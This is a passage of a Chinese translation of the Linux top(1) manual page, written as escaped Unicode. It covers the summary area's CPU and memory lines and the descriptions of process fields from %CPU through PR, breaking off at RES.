\u4ee5\u4e0b\u4e09\u4e2a\u533a\u57df\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u901a\u8fc7\u4e00\u4e2a\u6216\u591a\u4e2a\u4ea4\u4e92\u547d\u4ee4\u5355\u72ec\u63a7\u5236\u3002\u6709\u5173\u8fd9\u4e9b\u89c4\u5b9a\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4b. \u6982\u8981\u533a\u57df\u547d\u4ee4\u3002 2a. \u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u548c\u8d1f\u8f7d\u5e73\u5747\u503c \u8fd9\u4e00\u90e8\u5206\u7531\u5355\u884c\u7ec4\u6210\uff0c\u5305\u542b\uff1a \u7a0b\u5e8f\u6216\u7a97\u53e3\u540d\u79f0\uff0c\u53d6\u51b3\u4e8e\u663e\u793a\u6a21\u5f0f \u5f53\u524d\u65f6\u95f4\u548c\u81ea\u4e0a\u6b21\u542f\u52a8\u4ee5\u6765\u7684\u8fd0\u884c\u65f6\u95f4 \u603b\u7528\u6237\u6570 \u7cfb\u7edf\u5728\u8fc7\u53bb 1\u30015 \u548c 15 \u5206\u949f\u5185\u7684\u8d1f\u8f7d\u5e73\u5747\u503c 2b. \u4efb\u52a1\u548c CPU \u72b6\u6001 \u8fd9\u4e00\u90e8\u5206\u81f3\u5c11\u7531\u4e24\u884c\u7ec4\u6210\u3002\u5728\u591a\u5904\u7406\u5668\u73af\u5883\u4e2d\uff0c\u9644\u52a0\u884c\u53ef\u4ee5\u53cd\u6620\u5355\u4e2a CPU \u72b6\u6001\u767e\u5206\u6bd4\u3002 \u7b2c1\u884c\u663e\u793a\u603b\u4efb\u52a1\u6216\u7ebf\u7a0b\u6570\uff0c\u53d6\u51b3\u4e8e\u7ebf\u7a0b\u6a21\u5f0f\u5207\u6362\u7684\u72b6\u6001\u3002\u603b\u6570\u8fdb\u4e00\u6b65\u5206\u7c7b\u4e3a\uff1a \u8fd0\u884c\u4e2d\uff1b\u7761\u7720\u4e2d\uff1b\u505c\u6b62\uff1b\u50f5\u5c38 \u7b2c2\u884c\u663e\u793a\u57fa\u4e8e\u4e0a\u6b21\u5237\u65b0\u4ee5\u6765\u7684\u95f4\u9694\u7684 CPU \u72b6\u6001\u767e\u5206\u6bd4\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u4e0b\u5404\u7c7b\u522b\u7684\u767e\u5206\u6bd4\u5c06\u663e\u793a\u3002\u4e0b\u65b9\u663e\u793a\u4e86\u65b0\u5185\u6838\u7248\u672c\u4e2d\u7684\u4e24\u4e2a\u6807\u7b7e\u3002 us, \u7528\u6237 : \u8fd0\u884c\u975e\u4f18\u5148\u7528\u6237\u8fdb\u7a0b\u7684\u65f6\u95f4 sy, \u7cfb\u7edf : \u8fd0\u884c\u5185\u6838\u8fdb\u7a0b\u7684\u65f6\u95f4 ni, \u4f18\u5148 : \u8fd0\u884c\u4f18\u5148\u7528\u6237\u8fdb\u7a0b\u7684\u65f6\u95f4 id, \u7a7a\u95f2 : \u5728\u5185\u6838\u7a7a\u95f2\u5904\u7406\u7a0b\u5e8f\u4e2d\u82b1\u8d39\u7684\u65f6\u95f4 wa, IO\u7b49\u5f85 : \u7b49\u5f85 I/O \u5b8c\u6210\u7684\u65f6\u95f4 hi : \u670d\u52a1\u786c\u4ef6\u4e2d\u65ad\u7684\u65f6\u95f4 si : \u670d\u52a1\u8f6f\u4ef6\u4e2d\u65ad\u7684\u65f6\u95f4 st : \u88ab\u865a\u62df\u673a\u7ba1\u7406\u7a0b\u5e8f\u7a83\u53d6\u7684\u65f6\u95f4 \u5728\u66ff\u4ee3 CPU \u72b6\u6001\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u9664\u4e86\u7b2c\u4e00\u4efb\u52a1/\u7ebf\u7a0b\u884c\u4e4b\u5916\uff0c\u8fd8\u4f1a\u663e\u793a\u4e00\u4e2a\u7b80\u77ed\u7684\u6458\u8981\uff0c\u5305\u62ec\u4ee5\u4e0b\u5143\u7d20\uff1a a b c d %Cpu(s): 75.0/25.0 100[ ... \u5176\u4e2d\uff1aa) \u662f\u201c\u7528\u6237\u201d\uff08us + ni\uff09\u767e\u5206\u6bd4\uff1bb) \u662f\u201c\u7cfb\u7edf\u201d\uff08sy + hi + si\uff09\u767e\u5206\u6bd4\uff1bc) \u662f\u603b\u8ba1\uff1bd) \u662f\u8fd9\u4e9b\u8868\u793a\u7684\u4e00\u79cd\u89c6\u89c9\u56fe\u5f62\u3002 \u6709\u5173\u6b64\u7279\u6b8a\u56db\u5411\u5207\u6362\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4b. \u6982\u8981\u533a\u57df\u547d\u4ee4\u548c `t` \u547d\u4ee4\u3002 2c. \u5185\u5b58\u4f7f\u7528 \u8fd9\u4e00\u90e8\u5206\u7531\u4e24\u884c\u7ec4\u6210\uff0c\u53ef\u4ee5\u6839\u636e `E` \u4ea4\u4e92\u547d\u4ee4\u5f3a\u5236\u7684\u7f29\u653e\u56e0\u5b50\uff0c\u4ee5\u5343\u5b57\u8282\uff08KiB\uff09\u5230\u827e\u5b57\u8282\uff08EiB\uff09\u8868\u793a\u503c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7b2c1\u884c\u53cd\u6620\u7269\u7406\u5185\u5b58\uff0c\u5206\u7c7b\u4e3a\uff1a \u603b\u8ba1\uff0c\u7a7a\u95f2\uff0c\u5df2\u7528\u548c\u7f13\u51b2/\u7f13\u5b58 \u7b2c2\u884c\u4e3b\u8981\u53cd\u6620\u865a\u62df\u5185\u5b58\uff0c\u5206\u7c7b\u4e3a\uff1a \u603b\u8ba1\uff0c\u7a7a\u95f2\uff0c\u5df2\u7528\u548c\u53ef\u7528\uff08\u5373\u7269\u7406\u5185\u5b58\uff09 \u7b2c2\u884c\u4e2d\u7684 avail \u6570\u503c\u662f\u5bf9\u542f\u52a8\u65b0\u5e94\u7528\u7a0b\u5e8f\u7684\u7269\u7406\u5185\u5b58\u7684\u4f30\u8ba1\uff0c\u65e0\u9700\u4ea4\u6362\u3002\u4e0e free \u5b57\u6bb5\u4e0d\u540c\uff0c\u5b83\u8bd5\u56fe\u8003\u8651\u6613\u56de\u6536\u7684\u9875\u9762\u7f13\u5b58\u548c\u5185\u5b58\u677f\u6761\u3002 \u5728\u5185\u6838 3.14 \u4e0a\u53ef\u7528\uff0c\u5728\u5185\u6838 2.6.27+ \u4e0a\u6a21\u62df\uff0c\u5426\u5219\u4e0e free \u76f8\u540c\u3002 \u5728\u66ff\u4ee3\u5185\u5b58\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u4f1a\u663e\u793a\u4e24\u884c\u7b80\u77ed\u7684\u6458\u8981\uff0c\u5305\u62ec\u4ee5\u4e0b\u5143\u7d20\uff1a a b c GiB Mem : 18.7/15.738 [ ... GiB Swap: 0.0/7.999 [ ... \u5176\u4e2d\uff1aa) \u662f\u5df2\u7528\u767e\u5206\u6bd4\uff1bb) \u662f\u603b\u53ef\u7528\u91cf\uff1bc) \u662f\u8fd9\u4e9b\u8868\u793a\u7684\u4e00\u79cd\u89c6\u89c9\u56fe\u5f62\u3002 \u5bf9\u4e8e\u7269\u7406\u5185\u5b58\uff0c\u767e\u5206\u6bd4\u8868\u793a\u603b\u91cf\u51cf\u53bb\u4e0a\u8ff0\u4f30\u8ba1\u7684 avail\u3002'Mem' \u56fe\u672c\u8eab\u5206\u4e3a\u5df2\u7528\u548c\u672a\u88ab avail \u8003\u8651\u7684\u5269\u4f59\u5185\u5b58\u3002 \u6709\u5173\u6b64\u7279\u6b8a\u56db\u5411\u5207\u6362\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4b. \u6982\u8981\u533a\u57df\u547d\u4ee4\u548c `m` \u547d\u4ee4\u3002 \u6b64\u8868\u53ef\u80fd\u6709\u52a9\u4e8e\u89e3\u91ca\u663e\u793a\u7684\u7f29\u653e\u503c\uff1a KiB = \u5343\u5b57\u8282 = 1024 \u5b57\u8282 MiB = \u5146\u5b57\u8282 = 1024 KiB = 1,048,576 \u5b57\u8282 GiB = \u5409\u5b57\u8282 = 1024 MiB = 1,073,741,824 \u5b57\u8282 TiB = \u592a\u5b57\u8282 = 1024 GiB = 1,099,511,627,776 \u5b57\u8282 PiB = \u62cd\u5b57\u8282 = 1024 TiB = 1,125,899,906,842,624 \u5b57\u8282 EiB = \u827e\u5b57\u8282 = 1024 PiB = 1,152,921,504,606,846,976 \u5b57\u8282 3. \u5b57\u6bb5 / \u5217\u663e\u793a 3a. \u5b57\u6bb5\u63cf\u8ff0 \u4e0b\u65b9\u5217\u51fa\u7684\u662f top \u53ef\u7528\u7684\u8fdb\u7a0b\u5b57\u6bb5\uff08\u5217\uff09\u3002\u5b83\u4eec\u6309\u4e25\u683c\u7684 ASCII \u5b57\u6bcd\u987a\u5e8f\u663e\u793a\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 `f` \u6216 `F` \uff08\u5b57\u6bb5\u7ba1\u7406\uff09\u4ea4\u4e92\u547d\u4ee4\u81ea\u5b9a\u4e49\u5b83\u4eec\u7684\u4f4d\u7f6e\u4ee5\u53ca\u5b83\u4eec\u662f\u5426\u663e\u793a\u3002 \u4efb\u4f55\u5b57\u6bb5\u90fd\u53ef\u4ee5\u9009\u62e9\u4f5c\u4e3a\u6392\u5e8f\u5b57\u6bb5\uff0c\u5e76\u4e14\u4f60\u53ef\u4ee5\u63a7\u5236\u5b83\u4eec\u662f\u6309\u9ad8\u5230\u4f4e\u8fd8\u662f\u4f4e\u5230\u9ad8\u6392\u5e8f\u3002\u6709\u5173\u6392\u5e8f\u89c4\u5b9a\u7684\u66f4\u591a\u4fe1\u606f\uff0c \u8bf7\u53c2\u89c1\u4e3b\u9898 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4\uff0c\u6392\u5e8f\u3002 \u4e0e\u7269\u7406\u5185\u5b58\u6216\u865a\u62df\u5185\u5b58\u76f8\u5173\u7684\u5b57\u6bb5\u5f15\u7528 `(KiB)`\uff0c\u8fd9\u662f\u672a\u52a0\u540e\u7f00\u7684\u663e\u793a\u6a21\u5f0f\u3002\u7136\u800c\uff0c\u8fd9\u4e9b\u5b57\u6bb5\u53ef\u4ee5\u6309 KiB \u5230 PiB \u7f29\u653e\u3002 \u8fd9\u79cd\u7f29\u653e\u53d7 `e` \u4ea4\u4e92\u547d\u4ee4\u7684\u5f71\u54cd\u6216\u901a\u8fc7\u6784\u5efa\u9009\u9879\u4e3a\u542f\u52a8\u5efa\u7acb\u3002 1. %CPU -- CPU \u4f7f\u7528\u7387 \u81ea\u4e0a\u6b21\u5c4f\u5e55\u66f4\u65b0\u4ee5\u6765\u4efb\u52a1\u5360\u7528\u7684 CPU \u65f6\u95f4\u4efd\u989d\uff0c\u4ee5\u603b CPU \u65f6\u95f4\u7684\u767e\u5206\u6bd4\u8868\u793a\u3002 \u5728\u771f\u6b63\u7684 SMP \u73af\u5883\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u662f\u591a\u7ebf\u7a0b\u7684\u5e76\u4e14 top \u672a\u5728\u7ebf\u7a0b\u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u62a5\u544a\u7684\u503c\u53ef\u80fd\u8d85\u8fc7 100%\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 `H` \u4ea4\u4e92\u547d\u4ee4\u5207\u6362\u7ebf\u7a0b\u6a21\u5f0f\u3002 \u540c\u6837\u5bf9\u4e8e\u591a\u5904\u7406\u5668\u73af\u5883\uff0c\u5982\u679c Irix \u6a21\u5f0f\u5173\u95ed\uff0ctop \u5c06\u5728 Solaris \u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u5176\u4e2d\u4efb\u52a1\u7684 CPU \u4f7f\u7528\u91cf\u5c06\u9664\u4ee5 CPU \u603b\u6570\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 `I` \u4ea4\u4e92\u547d\u4ee4\u5207\u6362 Irix/Solaris \u6a21\u5f0f\u3002 \u6ce8\u610f\uff1a\u5f53\u4ee5\u6811\u72b6\u89c6\u56fe\u6a21\u5f0f\u8fd0\u884c\uff08`V`\uff09\u4e14\u5b50\u8fdb\u7a0b\u6298\u53e0\uff08`v`\uff09\u65f6\uff0c\u6b64\u5b57\u6bb5\u8fd8\u5c06\u5305\u62ec\u90a3\u4e9b\u672a\u89c1\u5b50\u8fdb\u7a0b\u7684 CPU \u65f6\u95f4\u3002 \u6709\u5173 `V` \u548c `v` \u5207\u6362\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4\uff0c\u5185\u5bb9\u3002 2. %MEM -- \u5185\u5b58\u4f7f\u7528\u7387\uff08RES\uff09 \u4efb\u52a1\u5f53\u524d\u9a7b\u7559\u7684\u53ef\u7528\u7269\u7406\u5185\u5b58\u4efd\u989d\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 3. CGNAME -- \u63a7\u5236\u7ec4\u540d\u79f0 \u8fdb\u7a0b\u6240\u5c5e\u7684\u63a7\u5236\u7ec4\u540d\u79f0\uff0c\u5982\u679c\u4e0d\u9002\u7528\uff0c\u5219\u4e3a `-`\u3002 \u8fd9\u901a\u5e38\u662f\u4e0b\u4e00\u6807\u9898\uff08CGROUPS\uff09\u4e2d\u663e\u793a\u7684\u63a7\u5236\u7ec4\u5217\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u6761\u76ee\u3002\u4e0e\u6b64\u5904\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u6b64\u5b57\u6bb5\u4e5f\u662f\u53ef\u53d8\u5bbd\u5ea6\u7684\u3002 4. CGROUPS -- \u63a7\u5236\u7ec4 \u8fdb\u7a0b\u6240\u5c5e\u7684\u63a7\u5236\u7ec4\u540d\u79f0\uff0c\u5982\u679c\u4e0d\u9002\u7528\uff0c\u5219\u4e3a `-`\u3002 \u63a7\u5236\u7ec4\u63d0\u4f9b\u5728\u5b89\u88c5\u5b9a\u4e49\u7684\u8fdb\u7a0b\u7ec4\u4e4b\u95f4\u5206\u914d\u8d44\u6e90\uff08CPU\u3001\u5185\u5b58\u3001\u7f51\u7edc\u5e26\u5bbd\u7b49\uff09\u7684\u80fd\u529b\u3002\u5b83\u4eec\u4f7f\u5f97\u80fd\u591f\u7cbe\u7ec6\u63a7\u5236\u5206\u914d\u3001\u62d2\u7edd\u3001\u4f18\u5148\u7ea7\u3001 \u7ba1\u7406\u548c\u76d1\u63a7\u8fd9\u4e9b\u8d44\u6e90\u3002 \u7cfb\u7edf\u4e0a\u53ef\u4ee5\u540c\u65f6\u5b58\u5728\u8bb8\u591a\u4e0d\u540c\u5c42\u6b21\u7684\u63a7\u5236\u7ec4\uff0c\u6bcf\u4e2a\u5c42\u6b21\u9644\u52a0\u5230\u4e00\u4e2a\u6216\u591a\u4e2a\u5b50\u7cfb\u7edf\u3002\u5b50\u7cfb\u7edf\u4ee3\u8868\u5355\u4e2a\u8d44\u6e90\u3002 \u6ce8\u610f\uff1aCGROUPS \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83\u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002 \u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 5. CODE -- \u4ee3\u7801\u5927\u5c0f\uff08KiB\uff09 \u5f53\u524d\u7528\u4e8e\u53ef\u6267\u884c\u4ee3\u7801\u7684\u7269\u7406\u5185\u5b58\u91cf\uff0c\u4e5f\u79f0\u4e3a\u6587\u672c\u9a7b\u7559\u96c6\u5927\u5c0f\u6216 TRS\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 6. COMMAND -- \u547d\u4ee4\u540d\u79f0\u6216\u547d\u4ee4\u884c \u663e\u793a\u7528\u4e8e\u542f\u52a8\u4efb\u52a1\u7684\u547d\u4ee4\u884c\u6216\u76f8\u5173\u7a0b\u5e8f\u7684\u540d\u79f0\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 `c` \u5207\u6362\u547d\u4ee4\u884c\u548c\u540d\u79f0\uff0c`c` \u65e2\u662f\u547d\u4ee4\u884c\u9009\u9879\u4e5f\u662f\u4ea4\u4e92\u547d\u4ee4\u3002 \u5f53\u4f60\u9009\u62e9\u663e\u793a\u547d\u4ee4\u884c\u65f6\uff0c\u6ca1\u6709\u547d\u4ee4\u884c\u7684\u8fdb\u7a0b\uff08\u5982\u5185\u6838\u7ebf\u7a0b\uff09\u5c06\u4ec5\u663e\u793a\u7a0b\u5e8f\u540d\u79f0\u5728\u62ec\u53f7\u4e2d\uff0c\u5982\u6b64\u793a\u4f8b\u6240\u793a\uff1a [kthreadd] \u6b64\u5b57\u6bb5\u8fd8\u53ef\u80fd\u53d7\u5230\u6811\u72b6\u89c6\u56fe\u663e\u793a\u6a21\u5f0f\u7684\u5f71\u54cd\u3002\u6709\u5173\u6b64\u6a21\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `V` \u4ea4\u4e92\u547d\u4ee4\u3002 \u6ce8\u610f\uff1aCOMMAND \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83 \u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002\u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u5c24\u5176\u662f\u5f53\u663e\u793a\u547d\u4ee4\u884c\u65f6\uff08`c` \u4ea4\u4e92\u547d\u4ee4\uff09\uff0c\u8fd9\u79cd\u60c5\u51b5\u5c24\u5176\u660e\u663e\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 7. DATA -- \u6570\u636e + \u5806\u6808\u5927\u5c0f\uff08KiB\uff09 \u8fdb\u7a0b\u4fdd\u7559\u7684\u79c1\u6709\u5185\u5b58\u91cf\u3002\u4e5f\u79f0\u4e3a\u6570\u636e\u9a7b\u7559\u96c6\uff08DRS\uff09\u3002\u8fd9\u79cd\u5185\u5b58\u53ef\u80fd\u5c1a\u672a\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\uff08RES\uff09\uff0c\u4f46\u5c06\u59cb\u7ec8\u5305\u542b\u5728\u865a\u62df\u5185\u5b58\uff08VIRT\uff09\u4e2d\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 8. ENVIRON -- \u73af\u5883\u53d8\u91cf \u663e\u793a\u5404\u4e2a\u8fdb\u7a0b\u770b\u5230\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\uff08\u5982\u679c\u6709\uff09\u3002\u8fd9\u4e9b\u53d8\u91cf\u5c06\u6309\u5176\u539f\u59cb\u987a\u5e8f\u663e\u793a\uff0c\u800c\u4e0d\u662f\u4f60\u4e60\u60ef\u4e8e\u4f7f\u7528\u672a\u9650\u5b9a `set` \u770b\u5230\u7684\u6392\u5e8f\u987a\u5e8f\u3002 \u6ce8\u610f\uff1aENVIRON \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83\u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002\u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u6b64\u5b57\u6bb5\u5c24\u5176\u5982\u6b64\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 9. Flags -- \u4efb\u52a1\u6807\u5fd7 \u6b64\u5217\u8868\u793a\u4efb\u52a1\u7684\u5f53\u524d\u8c03\u5ea6\u6807\u5fd7\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\uff0c\u5e76\u4e14\u96f6\u88ab\u6291\u5236\u3002\u8fd9\u4e9b\u6807\u5fd7\u5728 <linux/sched.h> \u4e2d\u6709\u5b98\u65b9\u6587\u6863\u3002 10. GID -- \u7ec4 ID \u6709\u6548\u7ec4 ID\u3002 11. GROUP -- \u7ec4\u540d\u79f0 \u6709\u6548\u7ec4\u540d\u79f0\u3002 12. LXC -- LXC \u5bb9\u5668\u540d\u79f0 \u4efb\u52a1\u8fd0\u884c\u6240\u5728\u7684 LXC \u5bb9\u5668\u7684\u540d\u79f0\u3002\u5982\u679c\u8fdb\u7a0b\u672a\u5728\u5bb9\u5668\u5185\u8fd0\u884c\uff0c\u5219\u663e\u793a\u7834\u6298\u53f7 (`-`)\u3002 13. NI -- \u4f18\u5148\u503c \u4efb\u52a1\u7684\u4f18\u5148\u503c\u3002\u8d1f\u4f18\u5148\u503c\u8868\u793a\u66f4\u9ad8\u4f18\u5148\u7ea7\uff0c\u800c\u6b63\u4f18\u5148\u503c\u8868\u793a\u8f83\u4f4e\u4f18\u5148\u7ea7\u3002\u6b64\u5b57\u6bb5\u4e2d\u7684\u96f6\u4ec5\u8868\u793a\u5728\u786e\u5b9a\u4efb\u52a1\u7684\u8c03\u5ea6\u4f18\u5148\u7ea7\u65f6\u4e0d\u4f1a\u8c03\u6574\u4f18\u5148\u7ea7\u3002 14. NU -- \u6700\u540e\u5df2\u77e5\u7684 NUMA \u8282\u70b9 \u4e00\u4e2a\u6570\u5b57\uff0c\u8868\u793a\u4e0e\u4e0a\u6b21\u4f7f\u7528\u7684\u5904\u7406\u5668\uff08`P`\uff09\u5173\u8054\u7684 NUMA \u8282\u70b9\u3002\u5f53\u663e\u793a -1 \u65f6\uff0c\u8868\u793a NUMA \u4fe1\u606f\u4e0d\u53ef\u7528\u3002 \u6709\u5173 NUMA \u529f\u80fd\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `2` \u548c `3` \u4ea4\u4e92\u547d\u4ee4\uff0c\u8fd9\u4e9b\u547d\u4ee4\u5f71\u54cd\u6458\u8981\u533a\u57df\u3002 15. OOMa -- \u5185\u5b58\u4e0d\u8db3\u8c03\u6574\u56e0\u5b50 \u503c\u7684\u8303\u56f4\u4ece -1000 \u5230 +1000\uff0c\u6dfb\u52a0\u5230\u5f53\u524d\u5185\u5b58\u4e0d\u8db3\u5f97\u5206\uff08OOMs\uff09\uff0c\u7136\u540e\u7528\u4e8e\u786e\u5b9a\u5728\u5185\u5b58\u8017\u5c3d\u65f6\u8981\u6740\u6b7b\u54ea\u4e2a\u4efb\u52a1\u3002 16. OOMs -- \u5185\u5b58\u4e0d\u8db3\u5f97\u5206 \u503c\u7684\u8303\u56f4\u4ece 0 \u5230 +1000\uff0c\u7528\u4e8e\u9009\u62e9\u5728\u5185\u5b58\u8017\u5c3d\u65f6\u8981\u6740\u6b7b\u7684\u4efb\u52a1\u3002\u96f6\u8868\u793a\u201c\u4ece\u4e0d\u6740\u201d\uff0c\u800c 1000 \u8868\u793a\u201c\u603b\u662f\u6740\u201d\u3002 17. P -- \u6700\u540e\u4f7f\u7528\u7684 CPU\uff08SMP\uff09 \u4e00\u4e2a\u6570\u5b57\uff0c\u8868\u793a\u6700\u540e\u4f7f\u7528\u7684\u5904\u7406\u5668\u3002\u5728\u771f\u6b63\u7684 SMP \u73af\u5883\u4e2d\uff0c\u8fd9\u4e2a\u503c\u53ef\u80fd\u4f1a\u9891\u7e41\u53d8\u5316\uff0c\u56e0\u4e3a\u5185\u6838\u6545\u610f\u4f7f\u7528\u5f31\u4eb2\u548c\u6027\u3002\u540c\u6837\uff0c\u8fd0\u884c top \u7684\u884c\u4e3a\u53ef\u80fd\u4f1a\u6253\u7834\u8fd9\u79cd\u5f31\u4eb2\u548c\u6027\uff0c\u5e76\u5bfc\u81f4\u66f4\u591a\u7684\u8fdb\u7a0b\u66f4\u9891\u7e41\u5730\u66f4\u6362 CPU\uff08\u7531\u4e8e\u5bf9 CPU \u65f6\u95f4\u7684\u989d\u5916\u9700\u6c42\uff09\u3002 18. PGRP -- \u8fdb\u7a0b\u7ec4 ID \u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u662f\u4e00\u4e2a\u552f\u4e00\u8fdb\u7a0b\u7ec4\u7684\u6210\u5458\uff0c\u8be5\u7ec4\u7528\u4e8e\u5206\u914d\u4fe1\u53f7\u548c\u7ec8\u7aef\u4ee5\u4ef2\u88c1\u5176\u8f93\u5165\u548c\u8f93\u51fa\u8bf7\u6c42\u3002\u521b\u5efa\u8fdb\u7a0b\uff08\u5206\u53c9\uff09\u65f6\uff0c\u5b83\u6210\u4e3a\u5176\u7236\u8fdb\u7a0b\u7ec4\u7684\u6210\u5458\u3002\u6309\u7167\u60ef\u4f8b\uff0c\u6b64\u503c\u7b49\u4e8e\u8fdb\u7a0b\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\u7684\u8fdb\u7a0b ID\uff08\u89c1 PID\uff09\uff0c\u79f0\u4e3a\u8fdb\u7a0b\u7ec4\u9886\u5bfc\u3002 19. PID -- \u8fdb\u7a0b ID \u4efb\u52a1\u7684\u552f\u4e00\u8fdb\u7a0b ID\uff0c\u5468\u671f\u6027\u5730\u5faa\u73af\uff0c\u4f46\u4ece\u4e0d\u91cd\u65b0\u542f\u52a8\u4e3a\u96f6\u3002\u5728\u5185\u6838\u672f\u8bed\u4e2d\uff0c\u5b83\u662f\u7531 task_struct \u5b9a\u4e49\u7684\u53ef\u8c03\u5ea6\u5b9e\u4f53\u3002 \u6b64\u503c\u8fd8\u53ef\u4ee5\u7528\u4f5c\uff1a\u8fdb\u7a0b\u7ec4 ID\uff08\u89c1 PGRP\uff09\uff1b\u4f1a\u8bdd ID\uff08\u89c1 SID\uff09\uff1b\u7ebf\u7a0b\u7ec4 ID\uff08\u89c1 TGID\uff09\uff1b\u548c TTY \u8fdb\u7a0b\u7ec4 ID\uff08\u89c1 TPGID\uff09\u3002 20. PPID -- \u7236\u8fdb\u7a0b ID \u4efb\u52a1\u7684\u7236\u8fdb\u7a0b ID\uff08pid\uff09\u3002 21. PR -- \u4f18\u5148\u7ea7 \u4efb\u52a1\u7684\u8c03\u5ea6\u4f18\u5148\u7ea7\u3002\u5982\u679c\u5728\u6b64\u5b57\u6bb5\u4e2d\u770b\u5230 `rt`\uff0c\u5219\u8868\u793a\u4efb\u52a1\u5728\u5b9e\u65f6\u8c03\u5ea6\u4f18\u5148\u7ea7\u4e0b\u8fd0\u884c\u3002 \u5728 Linux \u4e2d\uff0c\u5b9e\u65f6\u4f18\u5148\u7ea7\u6709\u70b9\u8bef\u5bfc\u6027\uff0c\u56e0\u4e3a\u4f20\u7edf\u4e0a\u64cd\u4f5c\u672c\u8eab\u4e0d\u53ef\u62a2\u5360\u3002\u867d\u7136 2.6 \u5185\u6838\u53ef\u4ee5\u53d8\u5f97\u5927\u90e8\u5206\u53ef\u62a2\u5360\uff0c\u4f46\u5e76\u4e0d\u603b\u662f\u8fd9\u6837\u3002 22. RES -- \u9a7b\u7559\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 